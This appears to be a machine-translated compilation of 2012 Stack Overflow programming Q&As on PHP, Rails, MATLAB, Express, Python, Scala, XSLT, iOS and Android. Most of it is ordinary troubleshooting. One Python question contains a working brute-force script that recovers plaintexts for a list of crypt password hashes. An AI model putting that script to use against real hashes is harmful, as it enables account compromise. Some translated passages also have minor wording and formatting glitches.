?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Import data from CSV file</title>
</head>

<body>
<?php if (!empty($_GET[success])) { echo "<b>Your file has been imported.</b><br><br>"; } //generic success notice ?>

<form action="" method="post" enctype="multipart/form-data" name="form1" id="form1">
  Choose your file: <br />
  <input name="csv" type="file" id="csv" />
  <input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html> 
```

现在我需要从一个新的 csv 文件在同一个 mysql 表中插入数据，如下所示：

[![](../Images/cff67081648b489b0210442b9da71d50.png)](https://i.stack.imgur.com/8QSx8.png)

您可以看到，新的 csv 只有 1 列包含诸如“区域 175/4”之类的数据，我需要删除“区域”并拆分“175”和“4”，然后需要插入具有 2 列的数据库表。

知道如何处理这个吗？

# ruby-on-rails - Rails：使用“Content_for”排除“Yield”的正确方法？

> ID：13537451
> 
> 赞同：0
> 
> 时间：2012-11-24T01:22:36.550
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, layout, containers

我有一个 Rails 应用程序，其中我将整个网站放入一个 980 宽度的容器中，并在我的“application.html.erb”文件中使用以下代码：

```
 <div class="container_980 white shadow-horizontal">
      <div class="container">
      <%= render 'layouts/flashes' %>
        <%= yield %>
      </div>
    </div> 
```

现在，我想创建 2 个文件例外来适应容器内的内容。我希望索引页面和另一个页面扩展到整个页面，所以我需要将这两个页面放在上面设置的常见“产量”之外。

我尝试这样做：

```
 <% if current_page?(root_url) %>
    <%= yield :index %>
  <% elsif current_page?(:controller => "tracks", :action => "show", :id => params[:id])) %>
    <%= yield :show_track %>  
  <% else %>
    <div class="container_980 white shadow-horizontal">
      <div class="container">
      <%= render 'layouts/flashes' %>
        <%= yield %>
      </div>
    </div> 
```

和

```
 <% content_for :show_track do %>
   blah blah blah 
 <% do %> 
```

问题：show_track 页面无法加载。我做了一些搜索，似乎上述方法应该有效，但事实并非如此，我想知道是否需要做其他事情，因为“显示”页面是通过脚手架（RESTful）制作的。

有没有比使用 if..else 条件更好的方法从容器中取出 2 页？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:51:38.643

> 有没有比使用 if..else 条件更好的方法从容器中取出 2 页？

这是主观的，但我会使用嵌套布局，然后在控制器中为每个页面类型定义布局。

首先是您的基本顶级布局。我将其称为“应用程序”，这是默认设置，但您可以随便称呼它。注意如果有`content_for? :application`它会产生它，否则它只会产生。这是设置的关键。所有嵌套布局都应该遵循类似的模式；通过这种方式，它们可以渲染更多嵌套的子布局，或者本身用作布局。

```
<!-- layouts/application.html.erb -->
<html>
  <body>
    <%= content_for?(:application) ? yield(:application) : yield %>
  </body>
</html> 
```

然后对于容器，您将定义可以嵌套在“应用程序”内的布局，这个布局设置您的容器 HTML 并在其中呈现内容。

```
<!-- layouts/container.html.erb -->
<%= content_for :application do %>
  <div class="container_980 white shadow-horizontal">
    <div class="container">
      <%= render 'layouts/flashes' %>
      <%= content_for?(:container) ? yield(:container) : yield %>
    </div>
  </div>
<% end %>

<%= render :file => "layouts/application" %> 
```

然后只需将条件逻辑移动到控制器，例如：

```
layout :determine_layout

protected

function determine_layout
  # pseudocode here, you get it
  (index or tracks) ? "application" : "container"
end 
```

* * *

**你可以停在那里。继续了解如何进一步嵌套布局。**

但是，您可以更进一步，使用嵌套布局设置来嵌套任意数量的不同布局。例如，假设轨道有另一个您需要填充的内容块。您可以定义另一个嵌套布局，例如：

```
 <!-- layouts/tracks.html.erb -->
 <%= content_for :some_other_block do %>
   // stuff that should be in some other block
 <% end %>

 <%= content_for :container do %>
   // stuff that should be in the container
 <% end %>

 <%= render :file => "layouts/container" %> 
```

然后在您的控制器中，您将更改您`determine_layout`的设置以设置轨道的“轨道”布局，例如：

```
function determine_layout
  # pseudocode here, you get it
  if index
    "application"
  elsif tracks
    "tracks"
  else
    "container"
  end
end 
```

# matlab - 在使用“while”结构进行循环时，如何使“if”选择结构适用于输入数组？

> ID：13537455
> 
> 赞同：1
> 
> 时间：2012-11-24T01:23:28.633
> 
> 标签：matlab

```
A=[21.04  93.3  133.5   158.5   182.5];   
k=0;
while k<=length(A)
    k=k+1;
    if A(k) <=170
        B=(4*10^-5).*(A).^2 + (0.0096).*A + 0.012;
    else
        B=(0.0005).*(A).^2 - (0.1503).*A + 14.131;
    end 
end 
```

我试图使用条件来解决具有两个结果的问题，但 Matlab 一直告诉我我不能使用 'if' 进行数组选择。我该如何改进它？请帮我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:30:30.323

这应该可以按现在的方式工作，但是我看到了一些问题。似乎您正试图使 B 依赖于 A 的值。我不认为您正在做您打算做的事情。一个更简单的方法是：

```
B=zeros(size(A))
B(A<=170)=(4*10^-5).*(A(A<=170)).^2 + (0.0096).*A(A<=170) + 0.012)
B(A>170)=(0.0005).*(A(A>170)).^2 - (0.1503).*A(A>170) + 14.131; 
```

另外，你循环太多了。for 循环会更容易理解，并且在这种情况下很有用：

```
for k=1:length(A)
    if A(k) <=170
        B=(4*10^-5).*(A).^2 + (0.0096).*A + 0.012;
    else
        B=(0.0005).*(A).^2 - (0.1503).*A + 14.131;
    end 
end 
```

# jpa - 如何将 JPA 1.0 项目转换为 JPA 2.0？

> ID：13537461
> 
> 赞同：1
> 
> 时间：2012-11-24T01:24:30.603
> 
> 标签：jpa, jpa-2.0, jpa-1.0

我们使用 JPA 1.0 已经有一段时间了。我们希望继续前进到 JPA 2.0。如何才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:30:14.380

您可能比[阅读 OpenJPA 的迁移指南](http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=%2Fcom.ibm.websphere.jpafep.multiplatform.doc%2Finfo%2Fae%2Fae%2Frejb_jpa2mig.html)更糟糕，然后问一个更具体的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:32:28.097

我们更改了版本名称和 xsd 如下：

```
<?xml version="1.0" encoding="UTF-8" ?>
<persistence xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"
             version="2.0" xmlns="http://java.sun.com/xml/ns/persistence"> 
```

效果很好。

如果您认为需要做其他事情，请在评论中提及，我会更新这个答案。

# javascript - express.js 不同的路由添加不同的资产

> ID：13537469
> 
> 赞同：0
> 
> 时间：2012-11-24T01:25:27.300
> 
> 标签：javascript, node.js, express

我的 javascripts 在普通的 public/js/ 文件夹中，对于像“/”、“/blogs”等普通路由，一切正常

```
 app.get('/blog', routes.blog)
    app.get('/', routes.index) 
```

所以在将资产加载到客户端快速日志时

```
 GET /js/jquery.js 304 3ms
    GET /js/bootstrap.js 304 3ms
    GET /js/showdown.js 304 2ms 
```

这里一切都很好，但是当我尝试像这样向 get 请求添加参数时

```
 app.get('/blog/:title', routes.blog) 
```

我得到这样的资产加载日志

```
 GET /blog/js/jquery.js 404 2ms
    GET /blog/js/bootstrap.js 404 2ms
    GET /blog/showdown.js 404 2ms 
```

为什么要将 js 的目录更改为“/blog/”。

我没有改变正常的 express app.js 设置，所以如果需要，我会发布它和我的所有依赖项，但首先我想看看是否有一个通用的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:29:04.623

您的 HTML 使用相对 URL`src`

```
<script src="js/jquery.js"></script> 
```

将其更改为以 a 开头的绝对 URL `/`，您会没事的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:29:11.377

我猜这是因为您的 HTML 文件使用相对路径加载资产，因此一旦 URL 中出现第二个正斜杠，路径就会变得混乱。例如，*“/blog”* = 好，*“/blog/”* = 坏。您需要为资产使用绝对路径（以正斜杠开头的路径，例如*"/blog/js/jquery.js"*），或者使用模板系统动态编写路径（类似于
*"{{rootpath}}blog /js/jquery.js”*）。

# php - Jquery File Upload，在页面加载时设置数据

> ID：13537470
> 
> 赞同：3
> 
> 时间：2012-11-24T01:25:35.203
> 
> 标签：php, jquery, file-upload, yii, yii-xupload

参考：PHP、Jquery 文件上传、Yii、XUpload

Jquery File Upload，取回上传的数据并使用UI Template显示（类似于上传后显示的模板，目的是使用UI Tempalte生成已经上传的数据）

[https://github.com/blueimp/jQuery-File-Upload](https://github.com/blueimp/jQuery-File-Upload)

“在页面加载时设置表单数据”

我已经上传了文件，这些文件是使用文件属性的 js_encode 自动查看的，xupload 会立即在模板上显示它们。但是当我下次再次访问该页面时，我将如何获得相同的视图/结果（假设文件已经上传并且上传开始尚未运行）？

我尝试在控制器中执行相同属性的 echo js_encode。相反，它只是打印出数据，并没有被 xupload 读取，这与上传文件后发生的情况不同。

我错过了什么吗？我一直在阅读，但还没有找到任何答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-10T18:13:12.650

我没有简单的方法来做到这一点，但我认为最简单的方法是检查代码，以及它如何构建并在您的视图中执行相同操作，使用相同的类应该触发相同的事件绑定和相同的布局。

如果您已经在 php.ini 的控制器/视图中拥有它们，我不确定为什么要使用 js 加载数据。不要过度使用 js，它只会让您的用户浏览器变慢并且控制器已经在“控制”数据。不，我是后端开发人员，但我的前端同事总是告诉我：“如果不需要，请避免 DOM 操作，这会使客户端变慢，并且每个浏览器的结果可能不同”

# python - 为什么我会收到 NameError？

> ID：13537472
> 
> 赞同：9
> 
> 时间：2012-11-24T01:25:44.707
> 
> 标签：python

我有以下代码：

```
from crypt import crypt
from itertools import product
from string import ascii_letters, digits

def decrypt(all_hashes, salt, charset=ascii_letters + digits + "-"):
     products = (product(charset, repeat=r) for r in range(8))
     chain = itertools.chain.from_iterable(products)
     for candidate in chain:
         hash = crypt(candidate, salt)
         if hash in all_hashes:
              yield candidate, hash
              all_hashes.remove(hash)
              if not all_hashes:
                 return

all_hashes = ['aaRrt6qwqR7xk', 'aaacT.VSMxhms' , 'aaWIa93yJI9kU',
'aakf8kFpfzD5E', 'aaMOPiDnXYTPE', 'aaz71s8a0SSbU', 'aa6SXFxZJrI7E'
'aa9hi/efJu5P.', 'aaBWpr07X4LDE', 'aaqwyFUsGMNrQ', 'aa.lUgfbPGANY'
'aaHgyDUxJGPl6', 'aaTuBoxlxtjeg', 'aaluQSsvEIrDs', 'aajuaeRAx9C9g'
'aat0FraNnWA4g', 'aaya6nAGIGcYo', 'aaya6nAGIGcYo', 'aawmOHEectP/g'
'aazpGZ/jXGDhw', 'aadc1hd1Uxlz.', 'aabx55R4tiWwQ', 'aaOhLry1KgN3.'
'aaGO0MNkEn0JA', 'aaGxcBxfr5rgM', 'aa2voaxqfsKQA', 'aahdDVXRTugPc'
'aaaLf47tEydKM', 'aawZuilJMRO.w', 'aayxG5tSZJJHc', 'aaPXxZDcwBKgo'
'aaZroUk7y0Nao', 'aaZo046pM1vmY', 'aa5Be/kKhzh.o', 'aa0lJMaclo592'
'aaY5SpAiLEJj6', 'aa..CW12pQtCE', 'aamVYXdd9MlOI', 'aajCM.48K40M.'
'aa1iXl.B1Zjb2', 'aapG.//419wZU']

all_hashes = set(all_hashes)
salt = 'aa'
for candidate, hash in decrypt(all_hashes, salt):
     print 'Found', hash, '! The original string was', candidate 
```

当我去运行它时，我得到以下回溯错误：

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 3, in decrypt
NameError: global name 'itertools' is not defined 
```

并且无法弄清楚为什么会这样。

有人请阐明一下，在此先感谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-24T01:26:53.597

好像不是进口`itertools`的。。。

```
from itertools import product 
```

不算，因为那只会`product`直接拉入您模块的命名空间（您的模块仍然对其余部分一无所知`itertools`。只需添加：

```
import itertools 
```

在脚本的顶部，该错误应该会消失，因为现在您已将`itertools`命名空间拉入模块的命名空间中，名为`itertools`. 换句话说，要访问该`chain`函数，您将使用`itertools.chain`（正如您在上面的脚本中所做的那样）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-24T01:43:06.167

你想要：

```
from itertools import chain, product 
```

并使用`chain`and `product`，或：

```
import itertools 
```

并使用`itertools.chain`和`itertools.product`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-03-17T03:04:17.810

```
import itertools

from itertools import izip_longest 
```

这帮助我使用`itertools`然后能够`izip_longest`用于迭代不均匀长度的数组。

# jquery - jquery.animate() 的性能 - 图像文件大小与图像尺寸大小

> ID：13537473
> 
> 赞同：3
> 
> 时间：2012-11-24T01:25:48.707
> 
> 标签：jquery, html, css

我正在构建一个包含大量图像和大量 jquery 动画的网站。在一个页面上，我们有几个部分，每个部分都有一个前景，其中包含 20 个图像的网格，这些图像通过 jquery.animate() 定期自动重新定位，并且背景图像受到视差滚动的影响。

有时我们会在动画中出现断断续续的情况。所以我正在努力寻找优化的方法。内容人正在上传高质量的图像。我想请他们降低质量。

在我这样做之前，我很好奇以下每一项如何影响动画的性能，以及是否一个比另一个更重要：

*   图像文件大小
*   图像尺寸
*   要考虑的其他图像属性

有人可以根据哪些因素对动画性能影响最大来确定这些考虑因素的优先级吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:44:48.530

文件大小不应该影响动画帧率，只影响下载时间。当更多的像素被动画时，动画会受到影响。例如，一个 100x100px 的图像是 10,000px 的动画，而一个 500x500px 的图像是 250,000 像素的动画。如果我没有回答您的所有问题，请告诉我。

回复您对问题的评论：一旦图像被渲染，图像是 png、jpg 等都没有关系。

# ruby-on-rails - 我更改了 session_store 配置中的域选项，现在以前的用户在不清除 cookie 的情况下无法登录或注册

> ID：13537481
> 
> 赞同：4
> 
> 时间：2012-11-24T01:26:20.650
> 
> 标签：ruby-on-rails, cookies, devise, subdomain, session-cookies

我有一个用户为 users_sessions 设计的 rails 3.2.8 应用程序。它以前有一个`config/initializers/session_store.rb`文件，如下所示：

```
AppName::Application.config.session_store :active_record_store 
```

该应用程序运行了一段时间，用户访问了该网站并注册了。然后我变了 `session_store.rb`

至

```
AppName::Application.config.session_store :active_record_store, domain: '.app_name.com' 
```

以便该会话可以跨子域持久化。我发现的问题是，之前访问过该网站并注册过的用户在清除 cookie 之前无法再进行操作。如何允许以前的用户登录而不要求他们清除他们的 cookie 并仍然允许他们的会话在子域之间保持不变？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:31:26.547

如果您更改会话 cookie 的名称，它不会删除旧的 cookie，但会强制每个人获取一个新的 cookie。

```
AppName::Application.config.session_store :new_name_store, domain: '.app_name.com' 
```

# javascript - 从输入字段打开 Elfinder 2.X

> ID：13537482
> 
> 赞同：2
> 
> 时间：2012-11-24T01:26:20.757
> 
> 标签：javascript, jquery

在我的 CMS 中，我使用了 Elfinder 1.X，它集成到 CKEditor 中，我也可以通过单击输入来打开另一个实例。现在我将 Elfinder 更新到 2.0 并且输入不再需要了。

这是我的代码：

```
function load_elfinder($id) {
$('<div />').elfinder({
url : 'lib/modules/elfinder/connectors/php/connector.php',
lang : 'hu',
dialog : { width : 900, modal : false },
editorCallback : function(url) {
document.getElementById($id).value = url;
}
})
} 
```

然后： $(".news_index").on('click',function(){ load_elfinder('news_index'); });

现在这个功能不起作用了。使用 CKEditor 可以完美运行。可能是什么问题呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T22:33:59.560

您还需要更改连接器代码。使用`getFileCallback`而不是`editorCallback`. 它是从 1.0 版更改的，但是 wiki 更新得不是很好。

# python - 将海龟图形保存到 .eps 文件时，背景颜色显示在屏幕上，但不保存在 .eps 文件中

> ID：13537483
> 
> 赞同：5
> 
> 时间：2012-11-24T01:26:23.370
> 
> 标签：python, tkinter, eps

我是 Python 新手，一直在使用 turtle 模块作为学习语言的一种方式。

感谢stackoverflow，我研究并学习了如何将图像复制到封装的postscript文件中，效果很好。然而，有一个问题。该`turtle`模块允许背景颜色显示在屏幕上但不显示在`.eps`文件中。所有其他颜色，即笔颜色和乌龟颜色，通过但不是背景颜色。

作为一个有趣的问题，我不相信 import of`Tkinter`是必要的，因为我不相信我在`Tkinter`这里使用任何模块。我将它作为尝试诊断问题的一部分。我也使用过`bgcolor=Orange`而不是`s.bgcolor="orange"`.

没有喜悦。

我包括一个简单的代码示例：

```
# Python 2.7.3 on a Mac

import turtle
from Tkinter import *

s=turtle.Screen()
s.bgcolor("orange")

bob = turtle.Turtle()
bob.circle(250)

ts=bob.getscreen()
ts.getcanvas().postscript(file = "turtle.eps") 
```

* * *

~~我试图发布屏幕和`.eps`文件的图像，但 stackoverflow 不允许我作为新用户这样做。某种垃圾邮件预防。虽然很简单，但屏幕的背景颜色为橙色，eps 文件为白色。~~

![从 .eps 文件产生的输出](../Images/4f70b111cee0cad332ee4a1f88d78ea6.png)

我会很感激任何想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T11:24:54.247

Postscript 设计用于在纸张或胶片等介质上制作标记，而不是光栅图形。因此，它本身没有可以设置为给定颜色的背景颜色，因为这通常是所使用的纸张或未曝光胶片的颜色。

为了模拟这一点，您需要绘制一个与画布大小相同的矩形，并用您想要的颜色填充它作为背景。我没有在 turtle 模块中看到任何查询返回的画布对象的`getcanvas()`内容，我能想到的唯一替代方法是读取 turtle.cfg 文件（如果有的话），或者只是硬编码默认的 300x400 大小。您也许可以查看源代码并找出当前画布的尺寸存储在哪里并直接访问它们。

**更新：**

我只是在 Python 控制台中使用该`turtle`模块，发现画布返回的内容有`getcanvas()`一个私有属性，称为. 该对象具有似乎包含当前海龟图形窗口尺寸的方法。所以我会尝试画一个那个大小的填充矩形，看看它是否能给你想要的东西。`_canvas``<Tkinter.Canvas instance>``winfo_width()``winfo_height()`

**更新 2：**

这是显示如何执行我建议的代码。**注意：**背景必须在任何其他图形*之前*绘制，否则创建的实心填充背景矩形将覆盖屏幕上的所有其他内容。

此外，添加的`draw_background()`功能会努力保存并稍后将图形状态恢复到原来的状态。根据您的具体使用情况，这可能不是必需的。

```
import turtle

def draw_background(a_turtle):
    """ Draw a background rectangle. """
    ts = a_turtle.getscreen()
    canvas = ts.getcanvas()
    height = ts.getcanvas()._canvas.winfo_height()
    width = ts.getcanvas()._canvas.winfo_width()

    turtleheading = a_turtle.heading()
    turtlespeed = a_turtle.speed()
    penposn = a_turtle.position()
    penstate = a_turtle.pen()

    a_turtle.penup()
    a_turtle.speed(0)  # fastest
    a_turtle.goto(-width/2-2, -height/2+3)
    a_turtle.fillcolor(turtle.Screen().bgcolor())
    a_turtle.begin_fill()
    a_turtle.setheading(0)
    a_turtle.forward(width)
    a_turtle.setheading(90)
    a_turtle.forward(height)
    a_turtle.setheading(180)
    a_turtle.forward(width)
    a_turtle.setheading(270)
    a_turtle.forward(height)
    a_turtle.end_fill()

    a_turtle.penup()
    a_turtle.setposition(*penposn)
    a_turtle.pen(penstate)
    a_turtle.setheading(turtleheading)
    a_turtle.speed(turtlespeed)

s = turtle.Screen()
s.bgcolor("orange")

bob = turtle.Turtle()
draw_background(bob)

ts = bob.getscreen()
canvas = ts.getcanvas()

bob.circle(250)

canvas.postscript(file="turtle.eps")

s.exitonclick()  # optional 
```

这是产生的实际输出（通过 Photoshop 在屏幕上渲染）：

![eps文件的输出](../Images/4e0e134c77b51a973190e1b58b3ac72a.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T02:18:34.303

我还没有找到在生成的（封装的）PostScript 文件上获取画布背景颜色的方法（我怀疑这是不可能的）。但是，您可以用颜色填充圆圈，然后`Canvas.postscript(colormode='color')`按照@mgilson 的建议使用：

```
import turtle

bob = turtle.Turtle()
bob.fillcolor('orange')
bob.begin_fill()
bob.circle(250)
bob.begin_fill()

ts = bob.getscreen()
ts.getcanvas().postscript(file='turtle.eps', colormode='color') 
```

# scala - 如何为具有默认参数的案例类编写 scala 提取器？

> ID：13537485
> 
> 赞同：4
> 
> 时间：2012-11-24T01:27:01.677
> 
> 标签：scala, case-class, extractor

我有以下带有默认参数的案例类，我想知道如何编写一个 unapply 方法，以便我可以提取前两个参数。

我希望下面的代码很清楚。

```
case class Point(x: Double, y: Double, _key: Option[String] = None) {
  def key: String = _key.getOrElse("")
}

object Point {
  def unapply(p: Point) = (p.x, p.y)
}

// pSeq is Seq[Point]
pSeq.map { case Point(x,y) => x + y } // This causes a compiler error:
                                      // wrong number of arguments for <none>: 
                                      // (x: Double, y: Double, _key: Option[String]) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T02:38:14.597

我不确定这是否是您正在寻找的，但它会为您提供您描述的 API。

```
sealed abstract class Point(x: Double, y: Double)
case class PointKey(x: Double, y: Double, _key: String) extends Point(x,y)
case class PointNoKey(x: Double, y: Double) extends Point(x,y)
object Point {
  def apply(x: Double, y: Double) = PointNoKey(x,y)
  def apply(x: Double, y: Double, _key: String) = PointKey(x,y,_key)
  def unapply(p: Point): Option[(Double,Double)] = p  match {
    case PointNoKey(x,y) => Some(x,y)
    case PointKey(x,y,_) => Some(x,y)
  }
} 
```

我认为如果对您有用，最好在案例类中使用通配符。

```
pSeq.map { case Point(x,y,_) => x + y } 
```

# php - 使用正则表达式格式化文本

> ID：13537486
> 
> 赞同：0
> 
> 时间：2012-11-24T01:27:04.993
> 
> 标签：php, html, regex

我有两个函数来格式化我的通知文本。

1.转换`[white-text][/white-text]`成`<font color=white></font>`

```
$string = preg_replace("/\[white-text\](\S+?)\[\/white-text\]/si","<font color=white>\\1</font>", $string); 
```

2.转换`[url][/url]`成`<a href></a>`

```
$string = preg_replace("/\[url\](\S+?)\[\/url\]/si","<a href=\"http://\\1\" target=\"_blank\">\\1</a>", $string); 
```

问题：
WHITE-TEXT - 如果短语只有一个单词，它只会改变颜色。
URL - 它工作正常，但我希望能够在 URL 的可读部分写入任何内容。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:39:20.853

> URL - 它工作正常，但我希望能够在 URL 的可读部分写入任何内容。

使 URL 代码具有格式`[url=href]description[/url]`，然后您可以使用这个简单的 RegExp

```
"/\[url=([^\]]*)\](.+?)\[\/url\]/si"
"<a href=\"http://\\1\" target=\"_blank\">\\2</a>" 
```

# iis - MSDeploy 代理是否需要 IIS？

> ID：13537493
> 
> 赞同：3
> 
> 时间：2012-11-24T01:29:38.163
> 
> 标签：iis, windows-services, msdeploy

我使用 MSDeploy 将 asp.net 站点部署到带有 IIS 的服务器。我还使用 MSDeploy 将 Windows 服务部署到具有 IIS 的相同服务器。

我的 MSDeploy 代理在`https://computername:8172/MSDEPLOYAGENTSERVIC`E上监听

我正在评估将 Windows 服务部署到没有安装 IIS 的机器上是否可行。

MSDeploy 代理是否需要 IIS，或者代理可以在没有 IIS 的情况下运行吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T05:36:32.533

我已经在自己的环境中对此进行了测试。MSDeploy 可以在没有 IIS 的情况下安装。它适用于将 Windows 服务部署到没有 IIS 的机器上。

# ios - iOS：如何在 UINavigationController 中来回导航后保持选中/选中 UITableView 中标记的单元格？

> ID：13537495
> 
> 赞同：0
> 
> 时间：2012-11-24T01:30:06.620
> 
> 标签：ios, uitableview, uinavigationcontroller, checkmark

我有一个选项卡栏，其中一个选项卡有一个 UINavigationController，它被分配了一个根视图控制器，该控制器由一个 UITableView 组成，可以深入了解更多选择。在我的根视图控制器中选择一个项目后，我得到了另一个 uitableview，我使用以下代码在我的***cellForRowAtIndexPath***中使用以下代码只为该部分或组 分配***一个***复选标记。

 *```
if([self.checkedIndexPath isEqual:indexPath])
{
    cell.accessoryType = UITableViewCellAccessoryCheckmark;
}
else
{
    cell.accessoryType = UITableViewCellAccessoryNone;
} 
```

以及***didSelectRowAtIndexPath***中的以下内容：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
// Uncheck the previous checked row
if(self.checkedIndexPath)
{
    UITableViewCell* uncheckCell = [tableView
                                    cellForRowAtIndexPath:self.checkedIndexPath];
    uncheckCell.accessoryType = UITableViewCellAccessoryNone;
}
UITableViewCell* cell = [tableView cellForRowAtIndexPath:indexPath];
cell.accessoryType = UITableViewCellAccessoryCheckmark;
self.checkedIndexPath = indexPath;

[tableView deselectRowAtIndexPath:indexPath animated:YES];
} 
```

我的问题是，当我使用导航菜单上的后退按钮并返回相同的 UItableview 时，复选标记消失了。但是，当我在该视图中上下滚动时，情况并非如此。当我使用导航控制器来回移动时，如何将这些复选标记保留在那里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:45:52.643

我相信您遇到了这个问题，因为每当您来回移动时，您都会推送一个新的 UIViewController 实例 - 新实例不知道之前的 checkedPath 属性是什么。

要解决此问题，您需要：

1.  以某种方式保留检查的行值（NSUserDefaults、CoreData 等）。这样任何实例都将获得相同的选中行值
2.  推送时重复使用相同的视图控制器。*

# xslt - 使用 XSL 将 xml 转换为 xml（较短的版本）

> ID：13537499
> 
> 赞同：1
> 
> 时间：2012-11-24T01:30:49.307
> 
> 标签：xslt, xslt-2.0

**原始**- 这是我的原始 XML：

```
<course acad_year="2012" cat_num="85749" offered="N" next_year_offered="2013">
  <term term_pattern_code="4" fall_term="Y" spring_term="Y">full year</term>
  <department code="VES">
    <dept_long_name>Department of Visual and Environmental Studies</dept_long_name>
    <dept_short_name>Visual and Environmental Studies</dept_short_name>
  </department>
</course> 
```

**期望的结果**- 我正在尝试创建原始 XML 的另一个较短版本，它将分组并列出所有部门代码，如下例所示：

```
 <departments>
      <department code="some_code" name="some_name"/>
      <department code="some_code" name="some_name"/>
      <department code="some_code" name="some_name"/>
   </departments> 
```

**这是我正在尝试但不工作的：**

```
 <xsl:template match="/">
       <departments>
          <xsl:for-each-group select="fas_courses/course" group-by="department[@code]">
            <xsl:text disable-output-escaping="yes"> <department code=" </xsl:text>
            <xsl:value-of select="department/@code"/>
            <xsl:text>" name="</xsl:text>
            <xsl:value-of select="dept_short_name"/>
            <xsl:text disable-output-escaping="yes">"><department/></xsl:text>
         </xsl:for-each-group> 
       </departments>
   </xsl:template> 
```

**我得到的错误** F [Saxon-PE 9.4.0.3] 与元素类型“部门”关联的属性“代码”的值不能包含“<”字符。

从错误消息中，我了解到 '<' 字符在 xsl:text 元素内给了我一个错误，但是我该如何放置那个字符呢？，我已经在使用 disable-output-escaping="yes"，是还有什么吗？？？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T08:11:48.177

使用 disable-output-escaping 从来都不是一个好主意，在这里你真的不需要它。试试这个：

```
<xsl:template match="/">
  <departments>
    <xsl:for-each-group select="fas_courses/course" group-by="department/@code">
      <department code="{department/@code}" name="{department/dept_short_name}" />
    </xsl:for-each-group> 
  </departments>
</xsl:template> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:36:32.850

您需要在 <[DATA[...]]> 中写入文本，这样它就不会被解析或使用 < 和 > 作为您输出的标签。

# android - 在警报对话框中更改文本颜色？

> ID：13537500
> 
> 赞同：1
> 
> 时间：2012-11-24T01:30:55.857
> 
> 标签：android, android-layout

我正在尝试制作一个警告对话框，该对话框将向用户提出问题，并且消息中的某些文本将显示为红色。

这是我尝试过的：

```
AlertDialog.Builder dlgAlert = new AlertDialog.Builder(
                        this);
                String You = "<font color='red'>you</font>?";
                dlgAlert.setMessage("How are " + Html.fromHtml(You));
                dlgAlert.setTitle("Mood");
                dlgAlert.setPositiveButton("Good",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                    int which) {

                                dialog.dismiss();
                            }
                        });
                dlgAlert.setNeutralButton("Okay",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                    int which) {

                                dialog.dismiss();
                            }
                        });
                dlgAlert.setNegativeButton("Bad",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                    int which) {

                                dialog.dismiss();
                            }
                        });
                dlgAlert.setCancelable(false);
                dlgAlert.create().show(); 
```

它不会将“你”这个词变成红色。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:27:02.723

这是一种方法

在你的`Activity`：

```
LayoutInflater factory = LayoutInflater.from(this);
View dialog = factory.inflate(R.layout.example_dialog, null);
TextView title = (TextView) dialog.findViewById(R.id.message);
SpannableString text = new SpannableString("Test 123");  
text.setSpan(new ForegroundColorSpan(Color.RED), 0, 1, 0);
text.setSpan(new ForegroundColorSpan(Color.GREEN), 1, 2, 0);
text.setSpan(new ForegroundColorSpan(Color.DKGRAY), 2, 3, 0);
text.setSpan(new ForegroundColorSpan(Color.CYAN), 3, 4, 0);

title.setText(text, BufferType.SPANNABLE);
AlertDialog.Builder builder = new AlertDialog.Builder(this);
builder.setView(dialog)
       .setTitle("Title")
       .setPositiveButton("OK", new DialogInterface.OnClickListener() {
              public void onClick(DialogInterface dialog, int id) {
                  // Do something
              }
        })
       .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
              public void onClick(DialogInterface dialog, int id) {
              }
        })
       .create()
       .show(); 
```

在 /layouts/example_dialog.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <TextView
        android:id="@+id/message"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:padding="10dp"
        android:textColor="#F70000" />

</LinearLayout> 
```

您还可以使用设置 TextColor`Html.fromHtml`

```
title.setText(Html.fromHtml("<font color='red'>Test</font><font color='blue'>ing</font>")); 
```

